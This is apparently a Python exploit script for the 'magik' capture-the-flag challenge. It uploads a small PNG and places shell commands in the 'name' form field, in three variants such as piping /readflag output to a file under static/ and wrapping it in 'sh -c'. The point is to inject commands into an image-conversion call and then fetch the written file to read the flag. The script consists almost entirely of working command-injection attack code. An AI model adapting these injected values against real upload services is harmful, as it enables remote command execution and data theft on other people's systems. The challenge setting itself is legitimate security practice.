#!/usr/bin/env python3
"""
Test if /readflag is actually being executed
Try writing to a location we can access
"""

import requests
import base64
import time

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it/"
png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==')

# Test 1: Execute /readflag and pipe to convert's stdin
# The command will be: convert /tmp/... ... static/x (pipe) /readflag (pipe) cat > static/output.png
print("[TEST 1] Pipe readflag output through cat")
r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': 'x |/readflag|cat>static/output'},
    timeout=10)
print(f"  Upload: {r.status_code}")
time.sleep(2)

r2 = requests.get(f"{URL}static/output", timeout=3)
print(f"  Fetch static/output: {r2.status_code}")
if r2.status_code == 200:
    # Get actual content
    raw = r2.content
    print(f"  Size: {len(raw)} bytes")
    # Try to decode
    try:
        text = raw.decode('utf-8', errors='ignore')
        if 'ptm{' in text:
            print(f"\n*** FLAG: {text} ***\n")
        else:
            print(f"  First 200 chars: {text[:200]}")
    except:
        print(f"  Binary: {raw[:100]}")

print("\n" + "="*60 + "\n")

# Test 2: Use sh -c to ensure command execution
print("[TEST 2] Use sh -c for explicit execution")
r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': 'x |sh -c "/readflag>static/sh_output" /app/dummy'},
    timeout=10)
print(f"  Upload: {r.status_code}")
time.sleep(2)

r2 = requests.get(f"{URL}static/sh_output", timeout=3)
print(f"  Fetch static/sh_output: {r2.status_code}")
if r2.status_code == 200:
    raw = r2.content
    print(f"  Size: {len(raw)} bytes")
    try:
        text = raw.decode('utf-8', errors='ignore')
        if 'ptm{' in text:
            print(f"\n*** FLAG: {text} ***\n")
        else:
            print(f"  First 200 chars: {text[:200]}")
    except:
        print(f"  Binary: {raw[:100]}")

print("\n" + "="*60 + "\n")

# Test 3: Check if static directory exists, write to root
print("[TEST 3] Write to app root directory")
r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': 'x |/readflag>flag_root.txt /app/dummy'},
    timeout=10)
print(f"  Upload: {r.status_code}")
time.sleep(2)

# Try to access from root
for path in ['flag_root.txt', 'static/../flag_root.txt']:
    try:
        r2 = requests.get(f"{URL}{path}", timeout=3)
        print(f"  Fetch {path}: {r2.status_code}")
        if r2.status_code == 200:
            raw = r2.content
            print(f"    Size: {len(raw)} bytes")
            try:
                text = raw.decode('utf-8', errors='ignore')
                if 'ptm{' in text:
                    print(f"\n*** FLAG: {text} ***\n")
            except:
                pass
    except:
        pass
